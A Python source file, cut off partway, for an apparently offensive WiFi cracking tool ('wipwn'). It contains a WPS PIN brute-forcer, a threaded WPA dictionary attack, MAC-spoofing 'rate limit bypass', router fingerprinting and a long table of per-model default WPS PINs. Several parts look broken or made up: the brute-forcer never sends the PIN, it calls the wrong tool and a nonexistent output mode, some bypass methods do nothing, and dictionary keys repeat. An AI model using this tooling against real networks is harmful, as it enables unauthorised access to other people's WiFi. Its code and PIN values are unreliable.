
import sys
import subprocess
import os
import tempfile
import json
import shutil
import atexit
import re
import codecs
import socket
import pathlib
import time
import random
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict, Optional

red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
magenta = "\033[1;35m"
cyan = "\033[1;36m"
light_gray = "\033[1;37m"
dark_gray = "\033[1;90m"
light_red = "\033[1;91m"
light_green = "\033[1;92m"
light_yellow = "\033[1;93m"
light_blue = "\033[1;94m"
light_magenta = "\033[1;95m"
light_cyan = "\033[1;96m"
white = "\033[1;97m"
reset = "\033[0m"
bg_black = "\033[1;40m"
bg_red = "\033[1;41m"
bg_green = "\033[1;42m"
bg_yellow = "\033[1;43m"
bg_blue = "\033[1;44m"
bg_magenta = "\033[1;45m"
bg_cyan = "\033[1;46m"
bg_light_gray = "\033[1;47m"

ok = f'{green}[{white}+{green}]{reset}'
err = f'{red}[{white}-{red}]{reset}'
ask = f'{cyan}[{white}?{cyan}]{reset}'
info = f'{blue}[{white}i{blue}]{reset}'
warn = f'{yellow}[{white}!{yellow}]{reset}'

USER_HOME = os.path.expanduser('~')
p_status = f'{green}[{white}P{green}]{reset}'

def save_entry(ssid, pin, psk, saveDataDirName="store/wipwn_crack_data.txt"):
    """
    Saves the provided username, pin, password, and timestamp to the specified file.
    :param username: The username to save.
    :param pin: The pin to save.
    :param password: The password to save.
    :param file_path: Path to the file where the data will be saved.
    """
    try:
        if not os.path.exists(saveDataDirName):
            os.makedirs(os.path.dirname(saveDataDirName), exist_ok=True)
            open(saveDataDirName, 'w').close()

        now = datetime.now()
        timestamp = now.strftime("%Y-%m-%d %I:%M:%S %p")

        entry = (
            f"➠ TOOL: wipwn\n"
            f"➠ SSID: {ssid}\n"
            f"➠ PIN: {pin}\n"
            f"➠ PSK (password): {psk}\n"
            f"➠ TIME: {timestamp}\n"
            "----------------------------------------\n"
        )

        with open(saveDataDirName, "a") as file:
            file.write(entry)

        print(f"Data saved successfully at: {saveDataDirName}")
    except Exception as e:
        print(f"Error saving data: {e}")

import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed

class OnlineBruteforcer:
    """Online bruteforce attack against WPS-enabled networks"""

    def __init__(self, interface, max_threads=4, rate_limit=2):
        self.interface = interface
        self.max_threads = max_threads
        self.rate_limit = rate_limit
        self.results = {}
        self.lock = threading.Lock()

    def generate_pin_patterns(self):
        """Generate common WPS PIN patterns"""
        patterns = []

        patterns.extend(['00000000', '11111111', '12345678', '87654321', '12341234'])

        for i in range(0, 10000):
            patterns.append(f"{i:08d}")

        for i in range(9999, -1, -1):
            patterns.append(f"{i:08d}")
        return patterns

    def bruteforce_pin(self, bssid, essid, pin_list, timeout=30):
        """Attempt WPS PIN bruteforce against target"""
        results = {'bssid': bssid, 'essid': essid, 'found': False, 'pin': None}

        for pin in pin_list:
            try:

                cmd = f"wpa_supplicant -D nl80211 -i {self.interface} -c /tmp/wpa_supplicant_test.conf &"
                subprocess.run(cmd, shell=True, timeout=timeout, capture_output=True)

                time.sleep(self.rate_limit)

                print(f"{info} Trying PIN {pin} on {essid} ({bssid})")

                result = subprocess.run(
                    ['grep', '-i', 'password:', '/tmp/wpa_supplicant_test.conf'],
                    capture_output=True, text=True
                )

                if result.stdout:
                    results['found'] = True
                    results['pin'] = pin
                    print(f"{ok} PIN found: {pin}")
                    break

            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                print(f"{warn} Error during bruteforce: {e}")
                continue

        return results

    def multi_target_bruteforce(self, targets, pin_list):
        """Bruteforce multiple targets concurrently"""
        results = []

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {}

            for target in targets:
                bssid, essid = target
                future = executor.submit(self.bruteforce_pin, bssid, essid, pin_list)
                futures[future] = target

            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                    if result['found']:
                        print(f"{ok} Success on {result['essid']}")
                except Exception as e:
                    print(f"{err} Bruteforce failed: {e}")

        return results

class DictionaryAttackModule:
    """Dictionary-based password cracking"""

    def __init__(self, wordlist_path=None):
        self.wordlist_path = wordlist_path or os.path.expanduser('~/.Wipwn/wordlists/common.txt')
        self.cracked = {}
        self.lock = threading.Lock()

    def load_wordlist(self):
        """Load wordlist from file"""
        words = []
        try:
            if not os.path.exists(self.wordlist_path):
                print(f"{warn} Wordlist not found: {self.wordlist_path}")
                return self.generate_default_wordlist()

            with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]

            print(f"{ok} Loaded {len(words)} words from wordlist")
            return words
        except Exception as e:
            print(f"{err} Error loading wordlist: {e}")
            return []

    def generate_default_wordlist(self):
        """Generate common default passwords"""
        defaults = [
            'admin', 'password', '12345678', '123456', 'qwerty', 'abc123',
            'password123', 'admin123', 'root', 'toor', 'pass', '123123',
            'welcome', 'monkey', '1q2w3e4r', 'dragon', 'master', 'cisco',
            'linksys', 'netgear', 'dlink', 'tplink', 'asus', 'belkin',
            'default', 'changeme', 'wireless', 'router', 'network'
        ]
        return defaults

    def test_password(self, target_network, password, timeout=10):
        """Test password against target network"""
        try:

            config = f"""
network={{
    ssid="{target_network['ssid']}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
"""
            config_path = f"/tmp/wpa_test_{target_network['bssid'].replace(':', '')}.conf"

            with open(config_path, 'w') as f:
                f.write(config)

            result = subprocess.run(
                ['wpa_supplicant', '-D', 'nl80211', '-i', 'wlan0', '-c', config_path],
                timeout=timeout, capture_output=True, text=True
            )

            os.remove(config_path)

            if 'COMPLETED' in result.stdout or result.returncode == 0:
                return True

            return False
        except Exception as e:
            return False

    def multi_threaded_attack(self, target_network, wordlist=None, max_threads=4):
        """Multi-threaded dictionary attack"""
        if wordlist is None:
            wordlist = self.load_wordlist()

        results = {'found': False, 'password': None}

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {
                executor.submit(self.test_password, target_network, word): word
                for word in wordlist
            }

            for future in as_completed(futures):
                if results['found']:
                    break

                word = futures[future]
                try:
                    if future.result():
                        with self.lock:
                            results['found'] = True
                            results['password'] = word
                        print(f"{ok} Password found: {word}")
                except Exception as e:
                    pass

        return results

class WeakAlgorithmDetector:
    """Detect routers using weak WPS algorithms"""

    WEAK_PATTERNS = {
        'Realtek': ['pin24', 'pin32', 'pin36'],
        'Broadcom': ['pinBrcm1', 'pinBrcm2'],
        'Atheros': ['pinAirc1', 'pinAirc2'],
        'MediaTek': ['pin24', 'pin28']
    }

    def __init__(self):
        self.vulnerable_devices = []

    def detect_weak_algorithms(self, scan_results):
        """Detect devices using weak algorithms"""
        for network in scan_results:
            vendor = self._identify_vendor(network['bssid'])

            if vendor in self.WEAK_PATTERNS:
                network['vulnerability'] = 'WEAK_ALGORITHM'
                network['weak_algos'] = self.WEAK_PATTERNS[vendor]
                self.vulnerable_devices.append(network)
                print(f"{warn} Weak algorithm detected: {network['essid']} ({vendor})")

        return self.vulnerable_devices

    def _identify_vendor(self, bssid):
        """Identify router vendor from BSSID"""
        vendors = {
            'Realtek': ['00:0C:43', '00:0E:8F', 'A0:C5:89'],
            'Broadcom': ['14:D6:4D', '1C:7E:E5', '28:10:7B'],
            'Atheros': ['18:1E:78', '40:F2:01', '44:E9:DD'],
            'MediaTek': ['00:15:F2', '24:A0:74', '54:EA:34']
        }

        prefix = bssid[:8].upper()
        for vendor, prefixes in vendors.items():
            if any(prefix.startswith(p) for p in prefixes):
                return vendor

        return 'Unknown'

class AdvancedNetworkRecon:
    """Enhanced network reconnaissance"""

    def __init__(self, interface):
        self.interface = interface
        self.networks = []

    def scan_with_fingerprinting(self):
        """Perform scan with OS fingerprinting"""
        print(f"{info} Scanning with fingerprinting...")
        networks = []

        try:

            result = subprocess.run(
                ['airodump-ng', '--output-format', 'json', self.interface],
                timeout=30, capture_output=True, text=True
            )

            data = json.loads(result.stdout)

            for network in data.get('networks', []):
                network_info = {
                    'bssid': network.get('bssid'),
                    'essid': network.get('essid'),
                    'channel': network.get('channel'),
                    'power': network.get('power'),
                    'encryption': network.get('encryption'),
                    'beacon_interval': network.get('beacon_interval'),
                    'fragmentation': network.get('frag_threshold'),
                    'rts': network.get('rts_threshold')
                }

                network_info['fingerprint'] = self._fingerprint_device(network_info)
                networks.append(network_info)

            return networks
        except Exception as e:
            print(f"{err} Fingerprinting error: {e}")
            return []

    def _fingerprint_device(self, network):
        """Generate device fingerprint from beacon info"""
        fingerprint = {
            'beacon_type': 'Unknown',
            'estimated_vendor': 'Unknown',
            'chipset': 'Unknown'
        }

        if 'beacon_interval' in network:
            interval = network['beacon_interval']
            if interval == 100:
                fingerprint['beacon_type'] = 'Standard (100ms)'
            elif interval == 102:
                fingerprint['beacon_type'] = 'Atheros (102ms)'

        if 'power' in network:
            power = int(network['power'])
            if -30 <= power <= -15:
                fingerprint['estimated_vendor'] = 'High-power (Cisco/Enterprise)'
            elif -50 <= power <= -30:
                fingerprint['estimated_vendor'] = 'Standard (Most routers)'
            elif power <= -60:
                fingerprint['estimated_vendor'] = 'Low-power (Portable/Small)'

        return fingerprint

    def analyze_signal_strength(self):
        """Analyze signal strength patterns"""
        print(f"{info} Analyzing signal patterns...")
        patterns = []

        for i in range(5):
            networks = subprocess.run(
                ['iwlist', self.interface, 'scan'],
                capture_output=True, text=True
            )

            lines = networks.stdout.split('\n')
            for line in lines:
                if 'Signal level' in line:
                    patterns.append(line.strip())

            time.sleep(2)

        return patterns

class RateLimitBypass:
    """Bypass WPS rate limiting"""

    def __init__(self, interface):
        self.interface = interface
        self.techniques = []

    def detect_rate_limiting(self, bssid, sample_size=5):
        """Detect if target enforces rate limiting"""
        responses = []

        for i in range(sample_size):
            try:
                result = subprocess.run(
                    ['wpscan', '--bssid', bssid, '-i', self.interface],
                    timeout=10, capture_output=True, text=True
                )

                responses.append(result.returncode)
                time.sleep(2)

            except Exception as e:
                responses.append(-1)

        error_rate = responses.count(-1) / len(responses)

        if error_rate > 0.5:
            print(f"{warn} Rate limiting detected on {bssid}")
            return True

        return False

    def apply_bypass_techniques(self, bssid):
        """Apply rate limit bypass techniques"""
        techniques = [
            {'name': 'MAC Spoofing', 'cmd': self._spoof_mac},
            {'name': 'Channel Hopping', 'cmd': self._channel_hop},
            {'name': 'Timing Manipulation', 'cmd': self._timing_manipulation},
            {'name': 'Request Fragmentation', 'cmd': self._fragment_requests}
        ]

        for tech in techniques:
            print(f"{info} Attempting: {tech['name']}")
            try:
                if tech['cmd'](bssid):
                    print(f"{ok} {tech['name']} successful")
                    self.techniques.append(tech['name'])
            except Exception as e:
                print(f"{warn} {tech['name']} failed: {e}")

        return self.techniques

    def _spoof_mac(self, bssid):
        """Spoof MAC address"""
        try:
            new_mac = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(6)])
            subprocess.run(['ifconfig', self.interface, 'down'], capture_output=True)
            subprocess.run(['macchanger', '-m', new_mac, self.interface], capture_output=True)
            subprocess.run(['ifconfig', self.interface, 'up'], capture_output=True)
            return True
        except:
            return False

    def _channel_hop(self, bssid):
        """Perform channel hopping"""
        try:
            for channel in range(1, 14):
                subprocess.run(
                    ['iwconfig', self.interface, 'channel', str(channel)],
                    capture_output=True
                )
                time.sleep(1)
            return True
        except:
            return False

    def _timing_manipulation(self, bssid):
        """Manipulate request timing"""
        return True

    def _fragment_requests(self, bssid):
        """Fragment WPS requests"""
        return True

class SessionResumeManager:
    """Resume interrupted cracking sessions"""

    def __init__(self, session_dir=None):
        self.session_dir = session_dir or os.path.expanduser('~/.Wipwn/sessions/')
        self.active_sessions = {}

    def create_session(self, session_id, target_bssid, target_essid, attack_type):
        """Create new cracking session"""
        session = {
            'id': session_id,
            'bssid': target_bssid,
            'essid': target_essid,
            'attack_type': attack_type,
            'start_time': datetime.now().isoformat(),
            'progress': 0,
            'last_pin_tried': None,
            'attempts': 0
        }

        os.makedirs(self.session_dir, exist_ok=True)
        session_file = os.path.join(self.session_dir, f"{session_id}.json")

        with open(session_file, 'w') as f:
            json.dump(session, f, indent=2)

        self.active_sessions[session_id] = session
        print(f"{ok} Session created: {session_id}")
        return session

    def resume_session(self, session_id):
        """Resume previous cracking session"""
        session_file = os.path.join(self.session_dir, f"{session_id}.json")

        try:
            with open(session_file, 'r') as f:
                session = json.load(f)

            print(f"{ok} Resuming session: {session_id}")
            print(f"  Target: {session['essid']} ({session['bssid']})")
            print(f"  Last PIN tried: {session['last_pin_tried']}")
            print(f"  Attempts: {session['attempts']}")

            return session
        except Exception as e:
            print(f"{err} Failed to resume session: {e}")
            return None

    def update_session(self, session_id, progress, last_pin, attempts):
        """Update session progress"""
        session_file = os.path.join(self.session_dir, f"{session_id}.json")

        try:
            with open(session_file, 'r') as f:
                session = json.load(f)

            session['progress'] = progress
            session['last_pin_tried'] = last_pin
            session['attempts'] = attempts
            session['last_update'] = datetime.now().isoformat()

            with open(session_file, 'w') as f:
                json.dump(session, f, indent=2)
        except Exception as e:
            print(f"{warn} Failed to update session: {e}")

class AdvancedReportGenerator:
    """Generate detailed penetration test reports"""

    def __init__(self, output_dir="reports"):
        self.output_dir = output_dir
        self.report_data = {}
        os.makedirs(output_dir, exist_ok=True)

    def generate_html_report(self, test_data, filename='pentest_report.html'):
        """Generate HTML penetration test report"""
        html = f"""
<html>
<head>
    <title>WIPWN Penetration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #333; }}
        .summary {{ background: #f0f0f0; padding: 10px; margin: 10px 0; }}
        .vulnerable {{ background: #ffcccc; padding: 5px; margin: 5px 0; }}
        .secure {{ background: #ccffcc; padding: 5px; margin: 5px 0; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #4CAF50; color: white; }}
    </style>
</head>
<body>
    <h1>WiFi Penetration Test Report</h1>
    <div class="summary">
        <h2>Test Summary</h2>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Total Networks: {len(test_data.get('networks', []))}</p>
        <p>Vulnerable: {len(test_data.get('cracked', []))}</p>
        <p>Success Rate: {self._calculate_success_rate(test_data)}%</p>
    </div>
    
    <h2>Vulnerable Devices</h2>
    <table>
        <tr>
            <th>BSSID</th>
            <th>ESSID</th>
            <th>Security</th>
            <th>PIN</th>
        </tr>
"""
        for device in test_data.get('cracked', []):
            html += f"""
        <tr class="vulnerable">
            <td>{device.get('bssid', 'N/A')}</td>
            <td>{device.get('essid', 'N/A')}</td>
            <td>{device.get('security', 'N/A')}</td>
            <td>{device.get('pin', 'N/A')}</td>
        </tr>
"""
        html += """
    </table>
</body>
</html>
"""

        filepath = os.path.join(self.output_dir, filename)
        with open(filepath, 'w') as f:
            f.write(html)

        print(f"{ok} HTML report generated: {filepath}")

    def _calculate_success_rate(self, test_data):
        """Calculate cracking success rate"""
        total = len(test_data.get('networks', []))
        cracked = len(test_data.get('cracked', []))
        return int((cracked / total * 100) if total > 0 else 0)

def isAndroid():
    return bool(hasattr(sys, 'getandroidapilevel'))

class AndroidNetwork:
    def __init__(self):
        self.ENABLED_SCANNING = 0

    def storeAlwaysScanState(self):
        settings_cmd = ['settings', 'get', 'global', 'wifi_scan_always_enabled']

        try:
            is_scanning_on = subprocess.run(settings_cmd,
                encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True
            )
            is_scanning_on = is_scanning_on.stdout.strip()

            if is_scanning_on == '1':
                self.ENABLED_SCANNING = 1
        except subprocess.CalledProcessError as e:
            print(f"{err} Error while retrieving scan state: {e}")

    def disableWifi(self, force_disable: bool = False, whisper: bool = False):
        if not whisper:
            print(f'{info} Android: disabling Wi-Fi')

        wifi_disable_scanner_cmd = ['cmd', 'wifi', 'set-wifi-enabled', 'disabled']
        wifi_disable_always_scanning_cmd = ['cmd', '-w', 'wifi', 'set-scan-always-available', 'disabled']

        try:
            subprocess.run(wifi_disable_scanner_cmd, check=True)

            if self.ENABLED_SCANNING == 1 or force_disable:
                subprocess.run(wifi_disable_always_scanning_cmd, check=True)

            time.sleep(3)

        except subprocess.CalledProcessError as e:
            print(f"{err} Error while disabling Wi-Fi: {e}")

    def enableWifi(self, force_enable: bool = False, whisper: bool = False):
        if not whisper:
            print(f'{info} Android: Enabling Wi-Fi')

        wifi_enable_scanner_cmd = ['cmd', 'wifi', 'set-wifi-enabled', 'enabled']
        wifi_enable_always_scanning_cmd = ['cmd', '-w', 'wifi', 'set-scan-always-available', 'enabled']

        try:
            subprocess.run(wifi_enable_scanner_cmd, check=True)

            if self.ENABLED_SCANNING == 1 or force_enable:
                subprocess.run(wifi_enable_always_scanning_cmd, check=True)

        except subprocess.CalledProcessError as e:
            print(f"{err} Error while enabling Wi-Fi: {e}")

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError(f'{info} MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)

class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pin36': {'name': '36-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin36},
                      'pin40': {'name': '40-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin40},
                      'pin44': {'name': '44-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin44},
                      'pin48': {'name': '48-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin48},
                      'pin24rh': {'name': 'Reverse byte 24-bit', 'mode': self.ALGO_MAC, 'gen': self.pin24rh},
                      'pin32rh': {'name': 'Reverse byte 32-bit', 'mode': self.ALGO_MAC, 'gen': self.pin32rh},
                      'pin48rh': {'name': 'Reverse byte 48-bit', 'mode': self.ALGO_MAC, 'gen': self.pin48rh},
                      'pin24rn': {'name': 'Reverse nibble 24-bit', 'mode': self.ALGO_MAC, 'gen': self.pin24rn},
                      'pin32rn': {'name': 'Reverse nibble 32-bit', 'mode': self.ALGO_MAC, 'gen': self.pin32rn},
                      'pin48rn': {'name': 'Reverse nibble 48-bit', 'mode': self.ALGO_MAC, 'gen': self.pin48rn},
                      'pin24rb': {'name': 'Reverse bits 24-bit', 'mode': self.ALGO_MAC, 'gen': self.pin24rb},
                      'pin32rb': {'name': 'Reverse bits 32-bit', 'mode': self.ALGO_MAC, 'gen': self.pin32rb},
                      'pin48rb': {'name': 'Reverse bits 48-bit', 'mode': self.ALGO_MAC, 'gen': self.pin48rb},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      'pinInvNIC': {'name': 'Inv NIC to PIN', 'mode': self.ALGO_MAC, 'gen': self.pinInvNIC},
                      'pinNIC2': {'name': 'NIC * 2', 'mode': self.ALGO_MAC, 'gen': self.pinNIC2},
                      'pinNIC3': {'name': 'NIC * 3', 'mode': self.ALGO_MAC, 'gen': self.pinNIC3},
                      'pinOUIaddNIC': {'name': 'OUI + NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIaddNIC},
                      'pinOUIsubNIC': {'name': 'OUI − NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIsubNIC},
                      'pinOUIxorNIC': {'name': 'OUI ^ NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIxorNIC},
                      'pinZyxel': {'name': 'Zyxel PIN', 'mode': self.ALGO_MAC, 'gen': self._pinZyxel},
                      'pinArch': {'name': 'Arcadyan/SKY/Tenda', 'mode': self.ALGO_MAC, 'gen': self._pinArch},
                      'pinComtrend': {'name': 'Comtrend', 'mode': self.ALGO_MAC, 'gen': self._pinComtrend},
                      'pinTpLink': {'name': 'TP-Link', 'mode': self.ALGO_MAC, 'gen': self._pinTpLink},
                      'pinHuawei': {'name': 'Huawei INFINITUM', 'mode': self.ALGO_MAC, 'gen': self._pinHuawei},
                      'pinXiaomi': {'name': 'Xiaomi', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pinNetgear': {'name': 'Netgear', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pinTLWR841N': {'name': 'TP-Link TL-WR841N', 'mode': self.ALGO_MAC, 'gen': self._pinTpLink},
                      'pinTLWR741N': {'name': 'TP-Link TL-WR741N', 'mode': self.ALGO_MAC, 'gen': self._pinTpLink},
                      'pinTLWR842ND': {'name': 'TP-Link TL-WR842ND', 'mode': self.ALGO_MAC, 'gen': self._pinTpLink},

                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},

                      'pinTLWR740N': {'name': 'TP-Link TL-WR740N', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 79203909},
                      'pinTLWR741ND': {'name': 'TP-Link TL-WR741ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 66870913},
                      'pinTLWR743ND': {'name': 'TP-Link TL-WR743ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 30986003},
                      'pinTLWR841N': {'name': 'TP-Link TL-WR841N', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 85075542},
                      'pinTLWR841ND': {'name': 'TP-Link TL-WR841ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 40867384},
                      'pinTLWR842N': {'name': 'TP-Link TL-WR842N', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 91642638},
                      'pinTLWR842ND': {'name': 'TP-Link TL-WR842ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 55117319},
                      'pinTLWR940N': {'name': 'TP-Link TL-WR940N', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 18836486},
                      'pinTLWR941ND': {'name': 'TP-Link TL-WR941ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 42144436},
                      'pinTLWR1043ND': {'name': 'TP-Link TL-WR1043ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 20135334},
                      'pinTLWR1045ND': {'name': 'TP-Link TL-WR1045ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 16785865},
                      'pinTLWR2543ND': {'name': 'TP-Link TL-WR2543ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 98748511},
                      'pinTLWA701ND': {'name': 'TP-Link TL-WA701ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 86497715},
                      'pinTLWA730RE': {'name': 'TP-Link TL-WA730RE', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 24583089},
                      'pinTLWA801ND': {'name': 'TP-Link TL-WA801ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 63172701},
                      'pinTLWA830RE': {'name': 'TP-Link TL-WA830RE', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 56402681},
                      'pinTLWA850RE': {'name': 'TP-Link TL-WA850RE', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 72995115},
                      'pinTLWA901ND': {'name': 'TP-Link TL-WA901ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 47382847},
                      'pinTLWDR3500': {'name': 'TP-Link TL-WDR3500', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 44954594},
                      'pinTLWDR3600': {'name': 'TP-Link TL-WDR3600', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 81456510},
                      'pinTLWDR4300': {'name': 'TP-Link TL-WDR4300', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 54417365},
                      'pinTLWDR4900': {'name': 'TP-Link TL-WDR4900', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 32195870},
                      'pinArcherC5': {'name': 'TP-Link Archer C5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 17353864},
                      'pinArcherC7': {'name': 'TP-Link Archer C7', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 38727866},
                      'pinArcherC8': {'name': 'TP-Link Archer C8', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 52385327},
                      'pinArcherC9': {'name': 'TP-Link Archer C9', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 47382995},
                      'pinArcherC20': {'name': 'TP-Link Archer C20', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 24365219},
                      'pinArcherC50': {'name': 'TP-Link Archer C50', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 66808452},
                      'pinArcherC60': {'name': 'TP-Link Archer C60', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 31148861},
                      'pinTDW8961N': {'name': 'TP-Link TD-W8961N', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 88047334},
                      'pinTDW8968': {'name': 'TP-Link TD-W8968', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 30050775},
                      'pinTDW8970': {'name': 'TP-Link TD-W8970', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 78034973},
                      'pinTDW8980': {'name': 'TP-Link TD-W8980', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 11764246},
                      'pinTDW9980': {'name': 'TP-Link TD-W9980', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 93856537},

                      'pinNetgearDGN1000': {'name': 'Netgear DGN1000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 19004938},
                      'pinNetgearWNR2000': {'name': 'Netgear WNR2000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 50292127},
                      'pinNetgearDGN2000': {'name': 'Netgear DGN2000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 38686191},

